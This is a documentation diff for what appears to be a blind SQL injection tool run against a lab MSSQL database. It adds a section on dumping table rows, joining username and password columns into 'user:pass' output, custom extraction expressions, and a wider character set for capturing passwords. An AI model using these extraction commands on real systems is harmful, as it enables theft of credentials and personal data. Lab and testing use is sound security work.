@@ -226,6 +226,25 @@ python -m blindsqli enumerate --what columns --table jun_users --database LabDB 
 this lists `LabDB` plus the MSSQL system databases, and scoping to `LabDB` vs
 `master` returns entirely different table sets.
 
+### Extracting column values (and concatenating columns)
+
+`--what rows` extracts the actual data. Give `--columns` a comma list; multiple
+columns are concatenated per row with `--sep` (via `CONCAT`, so a `username` and
+a `password` column come out as `user:pass`):
+
+```bash
+python -m blindsqli enumerate --what rows \
+  --database LabDB --table jun_users --columns "dan_username,dan_email" --sep ":" ...
+# -> ["atlas:atlas@example.com", "daniel:daniel@example.com", ...]
+```
+
+For a single scalar, `extract --expr "(SELECT CONCAT(u,':',p) FROM ... WHERE ...)"`
+still works. Extras for `--what rows`: `--where "id>0"`, `--order-by col`,
+`--schema` (default `dbo`), and `--row-expr` for a fully custom expression
+(e.g. a hash). Row extraction automatically widens the character set to
+printable ASCII (emails, passwords contain punctuation the identifier default
+omits); override with `--charset` if needed.
+
 ### Remembering what was already extracted
 
 Pass `--knowledge FILE` to any `extract` or `enumerate` run. Before the run the
